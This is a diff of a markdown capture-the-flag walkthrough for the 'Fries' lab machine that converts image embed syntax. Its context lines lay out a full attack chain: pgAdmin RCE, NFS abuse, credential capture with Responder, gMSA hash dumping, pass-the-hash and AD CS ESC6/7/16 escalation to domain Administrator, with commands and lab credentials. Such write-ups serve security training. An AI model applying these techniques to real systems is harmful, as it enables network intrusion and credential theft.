@@ -74,10 +74,10 @@ Remote Code Execution security vulnerability in `pgAdmin 4`. The vulnerability i
 
 I use a module in `matesploit` framework named as `multi/http/pgadmin_query_tool_authenticated`
 
-![[Pasted image 20260214193002.png]]
+![](Pasted image 20260214193002.png)
 
 `Meterpreter` : 
-![[Pasted image 20260214193037.png]]
+![](Pasted image 20260214193037.png)
 
 And we obtain remote code execution to linux host as `pgadmin`. After enumeration i mentioned that we are in `Docker Container` then i check an environment variables and found a password 
 
@@ -88,7 +88,7 @@ Friesf00Ds2025!!
 
 Also is interesting network in `ifconfig`
 
-![[Pasted image 20260214211821.png]]
+![](Pasted image 20260214211821.png)
 
 So after tunneling we could have access to local network , i will use a `ligolo-proxy` . When the agent is delivered to target container:
 
@@ -103,7 +103,7 @@ Target container:
 ```
 
 Also remembering that i am in AD environment i ping a `DC` to know his interface
-![[Pasted image 20260214212528.png]]
+![](Pasted image 20260214212528.png)
 
 So we got two interfaces in local network
 
@@ -115,14 +115,14 @@ So we got two interfaces in local network
 
 After simple enumeration with `nmap` and `ntx` i find a `NFS` ran in `172.18.0.1` host
 
-![[Pasted image 20260214213707.png]]
+![](Pasted image 20260214213707.png)
 
 Shares:
-![[Pasted image 20260214222316.png]]
+![](Pasted image 20260214222316.png)
 
 Checking a `NFS` shares i mentioned that there is mounted disk and probably for user `srv`
 Mention that root escape in True it's a serious misconfiguration and we can download all files in mounted disk. `/etc/shadow` has `root` access.
-![[Pasted image 20260214214720.png]]
+![](Pasted image 20260214214720.png)
 
 Main goal of this misconfig to create a new user and add him to `/etc/shadow` and `/etc/passwd` files.
 Create a password hash:
@@ -130,12 +130,12 @@ Create a password hash:
 openssl passwd -6 GreatPassword
 ```
 
-![[Pasted image 20260214215736.png]]
+![](Pasted image 20260214215736.png)
 Now replace target files in system
-![[Pasted image 20260214223909.png]]
+![](Pasted image 20260214223909.png)
 
 It's not worked because in `/etc/exports` we doesn't have a `no_root_squash`
-![[Pasted image 20260214224006.png]]
+![](Pasted image 20260214224006.png)
 
 But i have an other trick in this situation . From `/etc/passwd` file we know what users exists in target system the most interesting is `svc` and `barmen` and i tried to brute-force a credentials with existing passwords by ssh connection and we are on
 
@@ -146,7 +146,7 @@ svc : Friesf00Ds2025!!
 It's an initial foothold in domain but ONLY in ssh so we still need `barmen`
 
 On `NFS` share `/srv/web.fries.htb/certs` we got some certificates
-![[Pasted image 20260214225502.png]]![[Pasted image 20260214225647.png]]
+![](Pasted image 20260214225502.png]]![[Pasted image 20260214225647.png)
 
 And there nothing so the last trick it's to use this `NFS` share so first we need to create the same user as in target system second we need to mount `NFS` share in our kali machine.
 
@@ -191,7 +191,7 @@ All was done in directory
 ```
 
 After shell execution we got a shell as `barmen`. We are `svc` but can do anything what `barmen` can do 
-![[Pasted image 20260215002723.png]]
+![](Pasted image 20260215002723.png)
 
 Then i like to do `persistance` in target host. I create my own ssh key
 
@@ -219,13 +219,13 @@ ssh barman@fries.htb -i id_rsa.barmen
 ```
 
 Advantage of this that we are fully user `barman` via ssh
-![[Pasted image 20260215005429.png]]
+![](Pasted image 20260215005429.png)
 
 Working with `NFS` again our goal in credentials in Active Directory environment and one thing that i mentioned it is certs directory in `NFS` share 
-![[Pasted image 20260215012802.png]]
+![](Pasted image 20260215012802.png)
 Interesting group has access named as `Infra Managers` . Previously we discover what exists in this but directory.
 In kali box i see that group which has access to `/certs` named as `59605603`
-![[Pasted image 20260215013139.png]]
+![](Pasted image 20260215013139.png)
 
 So i can create this group and add myself , after copy all files
 
@@ -318,10 +318,10 @@ docker --tlsverify   --tlscacert=ca.pem  --tlscert=cert.pem --tlskey=certificate
   -H=tcp://127.0.0.1:2376 exec -it f42 /bin/bash
 ```
 
-![[Pasted image 20260215155402.png]]
+![](Pasted image 20260215155402.png)
 
 As we see there `https://pwm.fries.htb` 
-![[Pasted image 20260215155502.png]]
+![](Pasted image 20260215155502.png)
 
 There are  configuration file for `LDAPS` connection if we change him to our IP-address and catch him by `responder` maybe we obtain new credentials
 
@@ -332,7 +332,7 @@ find / -type f -name 'PwmConfiguration.xml' 2>/dev/null
 
 Location: `/config/PwmConfiguration.xml` 
 
-![[Pasted image 20260215160832.png]]
+![](Pasted image 20260215160832.png)
 
 I modify file via `sed` because it contains error with `nano` and transferring
 ```
@@ -345,7 +345,7 @@ sudo responder -I tun0
 ```
 
 And we catch a new clear-text credentials
-![[Pasted image 20260215163753.png]]
+![](Pasted image 20260215163753.png)
 
 ```
 svc_infra : m6tneOMAh5p0wQ0d
@@ -353,7 +353,7 @@ svc_infra : m6tneOMAh5p0wQ0d
 
 And this credentials is valid for DC authentication 
 
-![[Pasted image 20260215164140.png]]
+![](Pasted image 20260215164140.png)
 
 After access to domain `LDAP` i grep information by `bloodhound` 
 ```
@@ -367,7 +367,7 @@ So during enumeration i found a machine account `gMSA_CA_prod$` and user `svc_in
 nxc ldap dc01.fries.htb -u svc_infra -p m6tneOMAh5p0wQ0d --gmsa
 ```
 
-![[Pasted image 20260215172859.png]]
+![](Pasted image 20260215172859.png)
 
 New credentials:
 ```
@@ -375,7 +375,7 @@ gMSA_CA_prod$ :   :cb91dc519860daf4ccd15e89e5a9d5ad
 ```
 
 Machine account `gMSA_CA_prod$` has `WinRM` to `DC`. Using Pass-The-Hash attack authorize by `WinRM`
-![[Pasted image 20260215173138.png]]
+![](Pasted image 20260215173138.png)
 
 
 After simple enum i found a certificate vulnerability in system named
@@ -411,7 +411,7 @@ Verify
 certutil -config "DC01.fries.htb\fries-DC01-CA" -getreg policy\EditFlags
 ```
 
-![[Pasted image 20260216005318.png]]
+![](Pasted image 20260216005318.png)
 
 Flag `EDITF_ATTRIBUTESUBJECTALTNAME2` = 40000 , means that it is **ENABLED**
 
@@ -419,7 +419,7 @@ Flag `EDITF_ATTRIBUTESUBJECTALTNAME2` = 40000 , means that it is **ENABLED**
 **ESC16** prevents SID validation in the certificate, allowing identity impersonation Combined, they allow requesting a certificate for any user.
 
 After this we run again `certipy-ad` and find a `ESC7` and `ESC16`
-![[Pasted image 20260216010848.png]]
+![](Pasted image 20260216010848.png)
 ```
 certipy-ad find -u gMSA_CA_prod$@fries.htb -k -no-pass -target-ip  192.168.100.1 -dc-host dc01.fries.htb -vulnerable -target dc01.fries.htb
 ```
@@ -437,10 +437,10 @@ certipy-ad ca -u gMSA_CA_prod$@fries.htb -k -no-pass -target-ip  192.168.100.1 -
 ```
 
 Now user `svc_infra` 
-![[Pasted image 20260216015702.png]]
+![](Pasted image 20260216015702.png)
 
 We cat try to request cert via `SubCA`
-![[Pasted image 20260216020028.png]]
+![](Pasted image 20260216020028.png)
 
 This becomes a `ESC6` + `ESC7` certificate exploitation
 ##### **ESC6:**
@@ -467,7 +467,7 @@ Creds
 Administrator :  :a773cb05d79273299a684a23ede56748
 ```
 
-![[Pasted image 20260216021842.png]]
+![](Pasted image 20260216021842.png)
 And in `C:\Users\Administrator\Desktop` directory exists `user.txt` and `root.txt` 
 
 Thanks for reading 
